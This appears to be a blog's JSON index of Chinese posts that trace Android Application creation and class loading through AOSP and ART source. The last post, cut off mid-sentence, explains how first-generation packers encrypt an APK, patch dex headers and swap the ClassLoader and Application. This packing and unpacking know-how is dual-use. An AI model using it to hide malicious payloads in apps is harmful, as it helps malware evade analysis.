mResourcePackages.get(aInfo.packageName); &#125; LoadedApk packageInfo = ref != null ? ref.get() : null; if (packageInfo != null) &#123; ... &#125; if (localLOGV) &#123;... &#125; packageInfo =new LoadedApk(this, aInfo, compatInfo, baseLoader,securityViolation, includeCode&amp;&amp; (aInfo.flags &amp; ApplicationInfo.FLAG_HAS_CODE) != 0, registerPackage); if (mSystemThread &amp;&amp; &quot;android&quot;.equals(aInfo.packageName)) &#123; packageInfo.installSystemApplicationInfo(aInfo, getSystemContext().mPackageInfo.getClassLoader()); &#125; if (differentUser || isSdkSandbox) &#123; // Caching not supported across users and for sdk sandboxes &#125; else if (includeCode) &#123; mPackages.put(aInfo.packageName,//更新mPackages，即将刚创建的packageInfo加入 new WeakReference&lt;LoadedApk&gt;(packageInfo)); &#125; else &#123; mResourcePackages.put(aInfo.packageName, new WeakReference&lt;LoadedApk&gt;(packageInfo)); &#125; return packageInfo; &#125; &#125; LoadedApk与Application一一对应，Application借助LoadedApk创建的，并存放在LoadedApk的mApplication字段，而在创建Application的过程中，也将LoadedApk存放在Application的mLoadedApk字段。最后返回Application的时候，也将Application存放在ActivityThread中的mInitialApplication字段。 makeApplicationInner123456789101112131415161718192021222324252627282930313233343536//frameworks/base/core/java/android/app/LoadedApk.javaprivate Application makeApplicationInner(boolean forceDefaultAppClass, Instrumentation instrumentation, boolean allowDuplicateInstances) &#123; ... Application app = null; //新的application类 final String myProcessName = Process.myProcessName(); String appClass = mApplicationInfo.getCustomApplicationClassNameForProcess( myProcessName); if (forceDefaultAppClass || (appClass == null)) &#123; appClass = &quot;android.app.Application&quot;; &#125; try &#123; //获取当前应用进程的类加载器 (ClassLoader)，用于加载应用程序和库的类。 final java.lang.ClassLoader cl = getClassLoader(); ... &#125; ContextImpl appContext = ContextImpl.createAppContext(mActivityThread, this); // The network security config needs to be aware of multiple // applications in the same process to handle discrepancies NetworkSecurityConfigProvider.handleNewApplication(appContext); app = mActivityThread.mInstrumentation.newApplication( cl, appClass, appContext);// 调用Instrumentation.java的newApplication appContext.setOuterContext(app); &#125; catch (Exception e) &#123; ... &#125; mActivityThread.mAllApplications.add(app); mApplication = app; ... return app; &#125; ... &#125; newApplication12345678910111213141516171819//frameworks/base/core/java/android/app/Instrumentation.java//通过工厂模式动态加载并初始化一个 Application 类public Application newApplication(ClassLoader cl, String className, Context context) throws InstantiationException, IllegalAccessException, ClassNotFoundException &#123; //根据 context.getPackageName() 获取工厂实例，使用该工厂来实例化指定名称的 Application 类。 Application app = getFactory(context.getPackageName()) .instantiateApplication(cl, className); app.attach(context); return app;&#125;//通过反射机制动态创建 Application 类的实例static public Application newApplication(Class&lt;?&gt; clazz, Context context) throws InstantiationException, IllegalAccessException, ClassNotFoundException &#123; Application app = (Application)clazz.newInstance(); app.attach(context); return app;&#125; attach最后调用了attachBaseContext 123456//frameworks/base/core/java/android/app/Application.java @UnsupportedAppUsage /* package */ final void attach(Context context) &#123; attachBaseContext(context); mLoadedApk = ContextImpl.getImpl(context).mPackageInfo; &#125; attachBaseContext123456protected void attachBaseContext(Context base) &#123; if (mBase != null) &#123; throw new IllegalStateException(&quot;Base context already set&quot;); &#125; mBase = base;&#125;","categories":[],"tags":[],"keywords":[]},{"title":"Android类加载器层级关系及分析","slug":"Android类加载器层级关系及分析","date":"2024-11-21T12:31:48.000Z","updated":"2024-11-21T09:43:47.035Z","comments":true,"path":"2024/11/21/Android类加载器层级关系及分析/","link":"","permalink":"http://example.com/2024/11/21/Android%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%B1%82%E7%BA%A7%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%86%E6%9E%90/","excerpt":"","text":"有关类的加载在andriod_system_opreation_process篇 Android中的ClassLoader类型分为系统ClassLoader和自定义ClassLoader。其中系统ClassLoader包括3种是BootClassLoader、DexClassLoader、PathClassLoader(1)BootClassLoader:Android平台上所有Android系统启动时会使用BootClassLoader来预加载常用的类(2)BaseDexClassLoader:实际应用层类文件的加载，而真正的加载委托给pathList来完成(3)DexClassLoader:可以加载dex文件以及包含dex的压缩文件(apk,dex,jar,zip),可以安装一个未安装的apk文件，一般为自定义类加载器(4)PathClassLoader:可以加载系统类和应用程序的类，通常用来加载已安装的apk的dex文件Android 提供的原生加载器叫做基础类加载器，包括：BootClassLoader，PathClassLoader，DexClassLoader，InMemoryDexClassLoader（Android 8.0 引入），DelegateLastClassLoader（Android 8.1 引入） Android Code Search 安卓源码搜索网址 本文以15.0.0_r3为例分析 PathClassLoader用于系统和app的类加载器,其中optimizedDirectory为null PathClassLoader 是作为应用程序的系统类加载器，也是在 Zygote 进程启动的时候初始化的，它通常用于加载 已经安装的apk 里面的 .dex 文件。 （基本流程为：ZygoteInit.main() -&gt; ZygoteInit.forkSystemServer() -&gt; ZygoteInit.handleSystemServerProcess() -&gt; ZygoteInit.createPathClassLoader()。在预加载基本类之后执行），所以每一个 APP 进程从 Zygote 中 fork 出来之后都自动携带了一个 PathClassLoader。 123456789101112//路径：libcore/dalvik/src/main/java/dalvik/system/PathClassLoader.javapublic class PathClassLoader extends BaseDexClassLoader &#123; public PathClassLoader(String dexPath, ClassLoader parent) &#123; super(dexPath, null, null, parent); &#125; public PathClassLoader(String dexPath, String librarySearchPath, ClassLoader parent) &#123; super(dexPath, null, librarySearchPath, parent); &#125; &#125; DexClassLoader从包含classes.dex的jar或者apk中，加载类的类加载器, 可用于执行动态加载, 但必须是app私有可写目录来缓存odex文件. 能够加载系统没有安装的apk或者jar文件， 因此很多热修复和插件化方案都是采用DexClassLoader 123456789//路径：libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.javapublic class DexClassLoader extends BaseDexClassLoader &#123; public DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent) &#123; super(dexPath, null, librarySearchPath, parent); &#125; &#125; DexClassLoader提供了optimizedDirectory，而PathClassLoader则没有，optimizedDirectory用来存放odex文件的地方，所以可以利用DexClassLoader实现动态加载 BaseDexClassLoaderBaseDexClassLoader会初始化dexPathList，收集dex文件和Native文件动态库 12345678910//路径：libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.javapublic BaseDexClassLoader(String dexPath, File optimizedDirectory, String librarySearchPath, ClassLoader parent) &#123; super(parent); this.pathList = new DexPathList(this, dexPath, librarySearchPath, null); if (reporter != null) &#123; reporter.report(this.pathList.getDexPaths()); &#125;&#125; dexPath: 包含目标类或资源的apk&#x2F;jar列表;当有多个路径则采用:分割;optimizedDirectory: 优化后dex文件存在的目录, 可以为null;libraryPath: native库所在路径列表;当有多个路径则采用:分割;ClassLoader:父类的类加载器 DexPathList()主要负责管理和解析类加载器中涉及的 DEX 文件路径、优化后的 ODEX 文件、以及本地库（Native Libraries）的搜索路径 1234567891011121314151617181920212223242526272829303132//路径：libcore/dalvik/src/main/java/dalvik/system/DexPathList.javapublic final class DexPathList &#123; private Element[] dexElements;// DEX 文件/路径，dexElements: 根据多路径的分隔符“;”将dexPath转换成File列表，记录所有的dexFile private final List&lt;File&gt; nativeLibraryDirectories;// 本地库目录// 系统本地库路径，记录所有的Native动态库, 包括app目录的native库和系统目录的native库 private final List&lt;File&gt; systemNativeLibraryDirectories;// 系统本地库路径 public DexPathList(ClassLoader definingContext, String dexPath, String librarySearchPath, File optimizedDirectory，boolean isTrusted) &#123; ...... this.definingContext = definingContext; ArrayList&lt;IOException&gt; suppressedExceptions = new ArrayList&lt;IOException&gt;(); // 解析 dexPath，生成 dexElements this.dexElements = makeDexElements(splitDexPath(dexPath), optimizedDirectory, suppressedExceptions, definingContext, isTrusted);// // 解析 librarySearchPath，生成 nativeLibraryDirectories this.nativeLibraryDirectories = splitPaths(librarySearchPath, false); // 初始化系统本地库路径 this.systemNativeLibraryDirectories = splitPaths(System.getProperty(&quot;java.library.path&quot;), true); List&lt;File&gt; allNativeLibraryDirectories = new ArrayList&lt;&gt;(nativeLibraryDirectories); allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories); this.nativeLibraryPathElements = makePathElements(allNativeLibraryDirectories);// if (suppressedExceptions.size() &gt; 0) &#123; this.dexElementsSuppressedExceptions = suppressedExceptions.toArray(new IOException[suppressedExceptions.size()]); &#125; else &#123; dexElementsSuppressedExceptions = null; &#125; &#125; &#125;&#125; makeDexElementsmakeDexElements方法的作用是获取一个包含dex文件的元素集合 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//路径：libcore/dalvik/src/main/java/dalvik/system/DexPathList.javaprivate static Element[] makePathElements(List&lt;File&gt; files, File optimizedDirectory, List&lt;IOException&gt; suppressedExceptions) &#123; return makeDexElements(files, optimizedDirectory, suppressedExceptions, null); &#125;private static Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory, List&lt;IOException&gt; suppressedExceptions, ClassLoader loader) &#123; return makeDexElements(files, optimizedDirectory, suppressedExceptions, loader, false); &#125;private static Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory, List&lt;IOException&gt; suppressedExceptions, ClassLoader loader, boolean isTrusted) &#123; Element[] elements = new Element[files.size()]; int elementsPos = 0; //遍历所有文件 for (File file : files) &#123; if (file.isDirectory()) &#123;//文件夹 elements[elementsPos++] = new Element(file); &#125; else if (file.isFile()) &#123;//文件 String name = file.getName(); if (name.endsWith(DEX_SUFFIX)) &#123;// 判断文件后缀名，DEX_SUFFIX = &quot;.dex&quot; try &#123; //调用loadDexFile加载dex文件 DexFile dex = loadDexFile(file, optimizedDirectory, loader, elements); if (dex != null) &#123; elements[elementsPos++] = new Element(dex, null); &#125; &#125; catch (IOException suppressed) &#123; System.logE(&quot;Unable to load dex file: &quot; + file, suppressed); suppressedExceptions.add(suppressed); &#125; &#125; else &#123;//zip file? DexFile dex = null; try &#123; dex = loadDexFile(file, optimizedDirectory, loader, elements); &#125; catch (IOException suppressed) &#123;//zip中没有dex文件 suppressedExceptions.add(suppressed); &#125; if (dex == null) &#123; elements[elementsPos++] = new Element(file); &#125; else &#123; elements[elementsPos++] = new Element(dex, file); &#125; &#125; &#125; else &#123; System.logW(&quot;ClassLoader referenced unknown path: &quot; + file); &#125; &#125; if (elementsPos != elements.length) &#123; elements = Arrays.copyOf(elements, elementsPos); &#125; return elements;&#125; loadDexFile()加载DexFile文件，而且会把优化后的dex文件缓存到对应目录 12345678910//路径：libcore/dalvik/src/main/java/dalvik/system/DexPathList.javaprivate static DexFile loadDexFile(File file, File optimizedDirectory, ClassLoader loader, Element[] elements) throws IOException &#123; if (optimizedDirectory == null) &#123; return new DexFile(file, loader, elements); &#125; else &#123; String optimizedPath = optimizedPathFor(file, optimizedDirectory); return DexFile.loadDex(file.getPath(), optimizedPath, 0, loader, elements); &#125;&#125; DexFile()用来描述Dex文件，Dex的加载以及Class的查找都是由该类调用它的native方法完成的 12345678910111213//路径：libcore/dalvik/src/main/java/dalvik/system/DexFile.javaDexFile(File file, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123; this(file.getPath(), loader, elements);&#125;//进而调用DexFile(String fileName, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123; mCookie = openDexFile(fileName, null, 0, loader, elements); mInternalCookie = mCookie; mFileName = fileName; //System.out.println(&quot;DEX FILE cookie is &quot; + mCookie + &quot; fileName=&quot; + fileName);&#125; DexFile.loadDex()加载DexFile文件，而且会把优化后的dex文件缓存到对应目录 123456789101112131415//路径：libcore/dalvik/src/main/java/dalvik/system/DexFile.javastatic DexFile loadDex(String sourcePathName, String outputPathName, int flags, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123; return new DexFile(sourcePathName, outputPathName, flags, loader, elements);&#125;//进而调用private DexFile(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123; ...... mCookie = openDexFile(sourceName, outputName, flags, loader, elements); mInternalCookie = mCookie; mFileName = sourceName; //System.out.println(&quot;DEX FILE cookie is &quot; + mCookie + &quot; sourceName=&quot; + sourceName + &quot; outputName=&quot; + outputName);&#125; openDexFile()123456789101112//路径：/libcore/dalvik/src/main/java/dalvik/system/DexFile.javaprivate static Object openDexFile(String sourceName, String outputName, int flags, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123; // Use absolute paths to enable the use of relative paths when testing on host. return openDexFileNative(new File(sourceName).getAbsolutePath(), (outputName == null) ? null : new File(outputName).getAbsolutePath(), flags, loader, elements);&#125; sourceName为PathClassLoader构造函数传递的dexPath中以分隔符划分之后的文件名；outputName为null；flags &#x3D; 0loader为null；elements为makeDexElements()过程生成的Element数组； openDexFileNative()12345678910111213141516171819202122232425262728293031323334353637383940//路径：art/runtime/native/dalivk_system_DexFile.ccstatic jobject DexFile_openDexFileNative(JNIEnv* env, jclass, jstring javaSourceName, jstring javaOutputName ATTRIBUTE_UNUSED, jint flags ATTRIBUTE_UNUSED, jobject class_loader, jobjectArray dex_elements) &#123; ScopedUtfChars sourceName(env, javaSourceName); if (sourceName.c_str() == nullptr) &#123; return 0; &#125; Runtime* const runtime = Runtime::Current(); ClassLinker* linker = runtime-&gt;GetClassLinker(); std::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt; dex_files; std::vector&lt;std::string&gt; error_msgs; const OatFile* oat_file = nullptr; //打开oat文件 dex_files = runtime-&gt;GetOatFileManager().OpenDexFilesFromOat(sourceName.c_str(), class_loader, dex_elements, /*out*/ &amp;oat_file, /*out*/ &amp;error_msgs); if (!dex_files.empty()) &#123; jlongArray array = ConvertDexFilesToJavaArray(env, oat_file, dex_files); if (array == nullptr) &#123; ScopedObjectAccess soa(env); for (auto&amp; dex_file : dex_files) &#123; if (linker-&gt;IsDexFileRegistered(soa.Self(), *dex_file)) &#123; dex_file.release(); &#125; &#125; &#125; return array; &#125; else &#123; ...... &#125;&#125; OpenDexFilesFromOat它的主要作用是解析 OAT 文件并提取出嵌入的 DEX 文件，为后续的类加载过程服务 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182//路径：art/runtime/oat/oat_file_manager.ccstd::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt; OatFileManager::OpenDexFilesFromOat( const char* dex_location, jobject class_loader, jobjectArray dex_elements, const OatFile** out_oat_file, std::vector&lt;std::string&gt;* error_msgs) &#123; ScopedTrace trace(StringPrintf(&quot;%s(%s)&quot;, __FUNCTION__, dex_location)); CHECK(dex_location != nullptr); CHECK(error_msgs != nullptr); std::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt; dex_files;//定义一个存储 DexFile 的动态数组 std::unique_ptr&lt;ClassLoaderContext&gt; context( ClassLoaderContext::CreateContextForClassLoader(class_loader, dex_elements));//定义一个指向 ClassLoaderContext 对象的 unique_ptr //创建了一个 OatFileAssistant 对象 if (class_loader == nullptr) &#123; LOG(WARNING) &lt;&lt; &quot;Opening an oat file without a class loader. &quot; &lt;&lt; &quot;Are you using the deprecated DexFile APIs?&quot;; &#125; else if (context != nullptr) &#123; auto oat_file_assistant = std::make_unique&lt;OatFileAssistant&gt;(dex_location, kRuntimeISA, context.get(), runtime-&gt;GetOatFilesExecutable(), only_use_system_oat_files_);... // 使用 OatFileAssistant 来选择最佳的 .oat 文件 std::unique_ptr&lt;const OatFile&gt; oat_file(oat_file_assistant-&gt;GetBestOatFile().release()); VLOG(oat) &lt;&lt; &quot;OatFileAssistant(&quot; &lt;&lt; dex_location &lt;&lt; &quot;).GetBestOatFile()=&quot; &lt;&lt; (oat_file != nullptr ? oat_file-&gt;GetLocation() : &quot;&quot;) &lt;&lt; &quot; (executable=&quot; &lt;&lt; (oat_file != nullptr ? oat_file-&gt;IsExecutable() : false) &lt;&lt; &quot;)&quot;;... if (!added_image_space) &#123; DCHECK(dex_files.empty());...//OAT文件的优化 // 从指定的 .oat 文件中加载 DEX 文件 if (oat_file != nullptr) &#123; dex_files = oat_file_assistant-&gt;LoadDexFiles(*oat_file.get(), dex_location); ... &#125; &#125; if (dex_files.empty()) &#123; ScopedTrace failed_to_open_dex_files(&quot;FailedToOpenDexFilesFromOat&quot;); error_msgs-&gt;push_back(&quot;Failed to open dex files from &quot; + odex_location); &#125; else if (should_madvise) &#123; //...dex文件优化 &#125; &#125; if (oat_file != nullptr) &#123; VLOG(class_linker) &lt;&lt; &quot;Registering &quot; &lt;&lt; oat_file-&gt;GetLocation(); *out_oat_file = RegisterOatFile(std::move(oat_file)); &#125; &#125; else &#123; // oat_file == nullptr // 校验类路径中是否已经有正在加载的 dex 文件。 // 如果是，则报告错误并提供当前堆栈跟踪。 // 很可能开发人员并不打算这样做，因为这会浪费 // 性能和内存。 // 性能和内存。 ... &#125; &#125; //如果 Dex 文件加载失败，代码会尝试通过 ArtDexFileLoader 类重新加载，并提供详细的错误信息。 if (dex_files.empty()) &#123; std::string error_msg; static constexpr bool kVerifyChecksum = true; ArtDexFileLoader dex_file_loader(dex_location); if (!dex_file_loader.Open(Runtime::Current()-&gt;IsVerificationEnabled(), kVerifyChecksum, /*out*/ &amp;error_msg, &amp;dex_files)) &#123; ScopedTrace fail_to_open_dex_from_apk(&quot;FailedToOpenDexFilesFromApk&quot;); LOG(WARNING) &lt;&lt; error_msg; error_msgs-&gt;push_back(&quot;Failed to open dex files from &quot; + std::string(dex_location) + &quot; because: &quot; + error_msg); &#125; &#125;... return dex_files;&#125; LoadDexFiles()12345678910111213141516171819202122232425262728293031323334353637383940//art/runtime/oat/oat_file_assistant.ccbool OatFileAssistant::LoadDexFiles(const OatFile&amp; oat_file, const std::string&amp; dex_location, std::vector&lt;std::unique_ptr&lt;const DexFile&gt;&gt;* out_dex_files) &#123; // Load the main dex file. std::string error_msg; //通过oat_file.GetOatDexFile()获得oat、dex文件 const OatDexFile* oat_dex_file = oat_file.GetOatDexFile(dex_location.c_str(), &amp;error_msg); if (oat_dex_file == nullptr) &#123; LOG(WARNING) &lt;&lt; error_msg; return false; &#125; //通过oat_dex_file-&gt;OpenDexFile()打开dex文件 std::unique_ptr&lt;const DexFile&gt; dex_file = oat_dex_file-&gt;OpenDexFile(&amp;error_msg); if (dex_file.get() == nullptr) &#123; LOG(WARNING) &lt;&lt; &quot;Failed to open dex file from oat dex file: &quot; &lt;&lt; error_msg; return false; &#125; //添加dex文件到dex_files数组中 out_dex_files-&gt;push_back(std::move(dex_file)); // 看是否存在多个dex文件 for (size_t i = 1;; i++) &#123; std::string multidex_dex_location = DexFileLoader::GetMultiDexLocation(i, dex_location.c_str()); oat_dex_file = oat_file.GetOatDexFile(multidex_dex_location.c_str()); if (oat_dex_file == nullptr) &#123; // There are no more multidex entries to load. break; &#125; //打开第i个dex文件 dex_file = oat_dex_file-&gt;OpenDexFile(&amp;error_msg); if (dex_file.get() == nullptr) &#123; LOG(WARNING) &lt;&lt; &quot;Failed to open dex file from oat dex file: &quot; &lt;&lt; error_msg; return false; &#125; //添加dex文件到dex_files数组中 out_dex_files-&gt;push_back(std::move(dex_file)); &#125; return true;&#125; GetOatDexFile（）12345678910111213141516171819202122232425262728293031323334353637383940414243444546//art/runtime/oat/oat_file.ccconst OatDexFile* OatFile::GetOatDexFile(const char* dex_location, std::string* error_msg) const &#123; const OatDexFile* oat_dex_file = nullptr; std::string_view key(dex_location); //通过key在oat_dex_files_map中找到dex文件所在位置 auto primary_it = oat_dex_files_.find(key); if (primary_it != oat_dex_files_.end()) &#123; oat_dex_file = primary_it-&gt;second; DCHECK(oat_dex_file != nullptr); &#125; else &#123; // This dex_location is not one of the dex locations directly mentioned in the // oat file. The correct lookup is via the canonical location but first see in // the secondary_oat_dex_files_ whether we&#x27;ve looked up this location before. MutexLock mu(Thread::Current(), secondary_lookup_lock_); auto secondary_lb = secondary_oat_dex_files_.lower_bound(key); if (secondary_lb != secondary_oat_dex_files_.end() &amp;&amp; key == secondary_lb-&gt;first) &#123; oat_dex_file = secondary_lb-&gt;second; // May be null. &#125; else &#123; // We haven&#x27;t seen this dex_location before, we must check the canonical location. std::string dex_canonical_location = DexFileLoader::GetDexCanonicalLocation(dex_location); if (dex_canonical_location != dex_location) &#123; std::string_view canonical_key(dex_canonical_location); auto canonical_it = oat_dex_files_.find(canonical_key); if (canonical_it != oat_dex_files_.end()) &#123; oat_dex_file = canonical_it-&gt;second; &#125; // else keep null. &#125; // else keep null. // Copy the key to the string_cache_ and store the result in secondary map. string_cache_.emplace_back(key.data(), key.length()); std::string_view key_copy(string_cache_.back()); secondary_oat_dex_files_.PutBefore(secondary_lb, key_copy, oat_dex_file); &#125; &#125; if (oat_dex_file == nullptr) &#123; if (error_msg != nullptr) &#123; std::string dex_canonical_location = DexFileLoader::GetDexCanonicalLocation(dex_location); *error_msg = &quot;Failed to find OatDexFile for DexFile &quot; + std::string(dex_location) + &quot; (canonical path &quot; + dex_canonical_location + &quot;) in OatFile &quot; + GetLocation(); &#125; return nullptr; &#125; return oat_dex_file;&#125; OatDexFile::OpenDexFile12345678910111213//art/runtime/oat/oat_file.ccstd::unique_ptr&lt;const DexFile&gt; OatDexFile::OpenDexFile(std::string* error_msg) const &#123; ScopedTrace trace(__PRETTY_FUNCTION__); static constexpr bool kVerify = false; static constexpr bool kVerifyChecksum = false; ArtDexFileLoader dex_file_loader(dex_file_container_, dex_file_location_); return dex_file_loader.OpenOne(dex_file_pointer_ - dex_file_container_-&gt;Begin(), dex_file_location_checksum_, this, kVerify, kVerifyChecksum, error_msg);&#125; dex_file_loader.OpenOne12345678910111213141516171819202122232425262728293031//art/libdexfile/dex/dex_file_loader.ccstd::unique_ptr&lt;const DexFile&gt; DexFileLoader::OpenOne(size_t header_offset, uint32_t location_checksum, const OatDexFile* oat_dex_file, bool verify, bool verify_checksum, std::string* error_msg) &#123; //记录操作范围 DEXFILE_SCOPED_TRACE(std::string(&quot;Open dex file &quot;) + location_); uint32_t magic; if (!InitAndReadMagic(header_offset, &amp;magic, error_msg) || !MapRootContainer(error_msg)) &#123; DCHECK(!error_msg-&gt;empty()); return &#123;&#125;; &#125; //验证根容器 DCHECK(root_container_ != nullptr); DCHECK_LE(header_offset, root_container_-&gt;Size()); //加载DEX文件内容 std::unique_ptr&lt;const DexFile&gt; dex_file = OpenCommon(root_container_, root_container_-&gt;Begin() + header_offset, root_container_-&gt;Size() - header_offset, location_, location_checksum, oat_dex_file, verify, verify_checksum, error_msg, nullptr); return dex_file;&#125; DexFileLoader::OpenCommon123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//art/libdexfile/dex/dex_file_loader.ccstd::unique_ptr&lt;DexFile&gt; DexFileLoader::OpenCommon(std::shared_ptr&lt;DexFileContainer&gt; container,//指向包含DEX文件数据的容器对象 const uint8_t* base,//指向文件数据的起始地址。 size_t app_compat_size,//与应用兼容的文件大小。 const std::string&amp; location,//表示DEX文件的位置路径。 std::optional&lt;uint32_t&gt; location_checksum,//文件的校验和（可选值）。 const OatDexFile* oat_dex_file,//关联的OatDexFile对象。 bool verify,//是否启用DEX文件验证。 bool verify_checksum,//是否校验文件的校验和。 std::string* error_msg,//指向用于存储错误消息的字符串指针。 DexFileLoaderErrorCode* error_code//指向用于存储错误代码的指针。 ) &#123; //容器的初始化 if (container == nullptr) &#123; // We should never pass null here, but use reasonable default for app compat anyway. container = std::make_shared&lt;MemoryDexFileContainer&gt;(base, app_compat_size); &#125; CHECK_GE(base, container-&gt;Begin()); CHECK_LE(base, container-&gt;End()); const size_t size = container-&gt;End() - base; if (error_code != nullptr) &#123; *error_code = DexFileLoaderErrorCode::kDexFileError; &#125; //创建DEX文件实例 std::unique_ptr&lt;DexFile&gt; dex_file; auto header = reinterpret_cast&lt;const DexFile::Header*&gt;(base); if (size &gt;= sizeof(StandardDexFile::Header) &amp;&amp; StandardDexFile::IsMagicValid(base)) &#123; uint32_t checksum = location_checksum.value_or(header-&gt;checksum_); dex_file.reset(new StandardDexFile(base, location, checksum, oat_dex_file, container)); &#125; else if (size &gt;= sizeof(CompactDexFile::Header) &amp;&amp; CompactDexFile::IsMagicValid(base)) &#123; uint32_t checksum = location_checksum.value_or(header-&gt;checksum_); dex_file.reset(new CompactDexFile(base, location, checksum, oat_dex_file, container)); &#125; else &#123; *error_msg = StringPrintf(&quot;Invalid or truncated dex file &#x27;%s&#x27;&quot;, location.c_str()); &#125; if (dex_file == nullptr) &#123; *error_msg = StringPrintf(&quot;Failed to open dex file &#x27;%s&#x27;: %s&quot;, location.c_str(), error_msg-&gt;c_str()); return nullptr; &#125; //文件初始化 if (!dex_file-&gt;Init(error_msg)) &#123; dex_file.reset(); return nullptr; &#125; //可选校验 if (verify &amp;&amp; !dex_file-&gt;IsCompactDexFile()) &#123; DEXFILE_SCOPED_TRACE(std::string(&quot;Verify dex file &quot;) + location); if (!dex::Verify(dex_file.get(), location.c_str(), verify_checksum, error_msg)) &#123; if (error_code != nullptr) &#123; *error_code = DexFileLoaderErrorCode::kVerifyError; &#125; return nullptr; &#125; &#125; if (error_code != nullptr) &#123; *error_code = DexFileLoaderErrorCode::kNoError; &#125; return dex_file;&#125;","categories":[],"tags":[],"keywords":[]},{"title":"安卓第一/二代壳浅析","slug":"安卓第一二代壳浅析","date":"2024-11-21T12:25:30.000Z","updated":"2024-11-29T00:55:07.359Z","comments":true,"path":"2024/11/21/安卓第一二代壳浅析/","link":"","permalink":"http://example.com/2024/11/21/%E5%AE%89%E5%8D%93%E7%AC%AC%E4%B8%80%E4%BA%8C%E4%BB%A3%E5%A3%B3%E6%B5%85%E6%9E%90/","excerpt":"","text":"第一代壳第一代加固壳简介DEX 加密（也称落地加载）第一代壳将整个 apk 文件压缩加密到壳 dex 文件的后面，在壳 dex 文件上写上解压代码，动态加载执行，由于是加密整个 apk，在大型应用中很耗资源，因此这代壳很早就被放弃了但思路还是不变。其中这种加密还可以具体划分为几个方向，如下： Dex 字符串加密 静态 DEX 文件整体加密解密 资源加密（xml 与 arsc 文件加密及十六进制加密） 对抗反编译（针对反编译工具，如 apktool。利用反编译工具本身存在的缺陷，使得反编译失败，以此实现对反编译工具的抵抗） Ptrace 反调试、TracePid 值校验反调试 自定义 DexClassLoader（主要是针对 dex 文件加固、加壳等情况） 落地加载（dex 可以在 apk 目录下看到） 第一代加固壳原理涉及到三个程序： 待加壳程序的 APK（源程序 DEX） （脱）壳程序 APK（负责解密源程序 APK 并加载运行它） 加壳程序（将源程序 APK 进行加密并与壳程序的 dex 合并成新的 dex）。 主要步骤如下： 首先利用加密算法对源程序 APK 进行加密，然后与脱壳程序 APK 合并得到新的 dex 文件，最后替换脱壳程序中原有的 dex 文件即可。之后运行合并后的程序时，会通过壳程序对源程序进行解密和运行时加载。 具体实现源程序MainActivity 中添加一行 1Log.i(&quot;demo&quot;, &quot;app:&quot;+getApplicationContext()); 文件下添加一个 MyAppliaction 类，并重写一下 OnCreate，输出一下 Log。其实 Application 即使不创建，系统也会帮我们创建的。但是创建自定义 Application 类是为了方便反射获取 Application 类，进而创建源程序的 Application 实例来替换原有的壳程序的 Application 实例。 12345678public class MyApplication extends Application &#123; String TAG = &quot;demo&quot;; @Override public void onCreate() &#123; super.onCreate(); Log.d(TAG, &quot;SourceApk onCreate: &quot; + this); &#125;&#125; 加壳程序主要功能是加密源程序 APK、合并成新的 dex 文件、修正三个字段。常用 python 实现 对于合并后的 dex 文件，需要修改其 dex_header 中的三个字段： checksum：dex 文件（除 magic、checksum）的校验和（使用 adler32 算法），通过它来判断 dex 文件是否被损坏或篡改。 signature：dex 文件（除 magic、checksum 和 signature 之外的所有内容）的 SHA-1 签名（哈希），用于对文件进行唯一标识。 file_size：整个 dex 文件的大小。 脱壳程序由于我们最终需要运行的是我们的源程序，所以我们必须在启动流程调用 Application 的 OnCreate 之前释放出源程序，并替换 Application 为我们的源程序 Application 实例（原来是脱壳程序的 Application 实例）。 工作： 替换 LoadedApk 的 mClassLoader关键点： mClassLoader 的作用：ClassLoader 是用来加载应用程序的类文件的核心组件，通过双亲委托机制寻找和加载类。如果壳程序的 ClassLoader 不包含源程序的类，那么应用将无法正常运行。 **为什么需要替换 mClassLoader**： 壳程序本身的类加载器是基于壳的 APK，而源程序的类已经被加密或独立存储（例如在 Source.apk 中）。所以壳程序的 ClassLoader 无法直接加载源程序的类。这就需要创建一个包含源程序类路径的 DexClassLoader 替换壳的 ClassLoader。 替换方式： 三种替换 mClassLoader 的方法： 替换类加载器：用源程序的 DexClassLoader 完全替换壳的 ClassLoader。 插入类加载器：在壳的 ClassLoader 和其父加载器之间插入源程序的 DexClassLoader，实现动态加载源程序的类。 合并 dexElements：合并壳和源程序的 dexElements，复用壳的 ClassLoader，既不改变原有加载逻辑，又能访问源程序的类。 分析： 直接替换和插入的方式较简单，但可能引入与系统组件兼容性的问题。 合并 dexElements 更加优雅，也是在插件化、热修复等场景中常用的方法。 替换 Application 关键点： Application 的作用： Application 是整个安卓应用程序的上下文和入口点，负责初始化全局状态，并与 Activity、Service 等组件交互。壳程序和源程序可能对应不同的 Application 实例，为了正确运行源程序，必须替换掉壳的 Application。 替换方法： **删除壳的 Application**：从 ActivityThread 的 mAllApplications 中移除壳的 Application。 **设置 LoadedApk.mApplication 为 null**：清空 mApplication，让系统重新调用 makeApplication() 方法创建源程序的 Application。 **动态创建源程序的 Application**：通过 meta-data 提供的源程序 Application 类名反射生成对应实例。 **替换 ContentProvider 的 Application**：避免因不同 Application 导致组件交互问题。 运行源程序的 onCreate() 方法：完成初始化，开始应用生命周期。 分析： 替换 Application 是必要的，因为壳的 Application 只是个临时过渡，无法维护源程序的全局状态。 关键是要保证在替换前后应用的生命周期保持完整和一致，特别是对于一些较早初始化的组件（如 ContentProvider）。 选择 Application 作为脱壳的入口点 关键点： Application 的特殊性： 它是整个应用程序的入口点，生命周期贯穿应用始终。 在系统加载 Activity 或 Service 之前，Application 